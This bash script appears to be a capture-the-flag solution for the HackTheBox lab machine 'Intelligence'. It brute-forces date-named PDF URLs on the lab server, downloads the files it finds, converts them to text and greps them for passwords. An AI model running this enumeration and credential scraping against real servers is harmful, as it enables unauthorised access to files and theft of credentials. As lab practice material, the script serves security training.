#!/bin/bash 
#Machine "Intelligence" on Hackthebox 
#documents/2020-12-15-upload.pdf
mkdir /tmp/PdFiles
#Enumerating PDF's on the WebServer >> 
url="http://10.10.10.248/" 
for mon in {1..12}; do 
for day in {1..31} ; do 
full_url=""$url"documents/2020-$(printf "%02d" "$mon")-$(printf "%02d" "$day")-upload.pdf"
echo "$full_url"
found=false
pdf_req=$(curl -s  "$full_url"  | grep '404' | awk -F '-' '{print $1}' | awk -F '<h2>' '{print $1}' | awk -F 'tle>' '{print $2}'  ) 
if [[ *"$pdf_req"* == *"404"* ]];then 
found=false
echo "Not Found"
else 
found=true 
echo "Found : "$full_url""
#Downloading the PDF's
Download_Directory="/tmp/PdFiles"
Download_Pdf=$(wget -q "$full_url" -P "$Download_Directory" ) 
echo "Downloading PDF : "$full_url""
fi
done
done
#Converting Pdf's to Txt Files 
pdf_directory="/tmp/PdFiles" 
for pdf in  "$pdf_directory"/*.pdf ; do
pdftwotext=$( pdftotext "$pdf" ) 
done
#Reading All TxT Files and Grep For Password >>
grep_pass=$(cat "$pdf_directory"/*.txt | grep -e 'password' -B 1 )
echo "==============================" 
echo "Read This : "
 echo -e $grep_pass 

